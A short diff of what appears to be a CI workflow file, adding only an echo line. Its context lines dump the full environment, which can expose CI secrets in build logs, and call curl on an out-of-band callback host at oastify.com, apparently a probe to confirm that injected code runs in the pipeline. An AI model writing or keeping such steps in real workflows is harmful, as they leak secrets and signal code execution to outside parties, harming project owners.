@@ -23,6 +23,7 @@ jobs:
       run: |
         echo $($USER)
         echo $(env)
+        echo "a"
         curl http://fziqlrpi6ofqfc4p3b36v4356wcn0ko9.oastify.com/
         
     - name: send_run_log
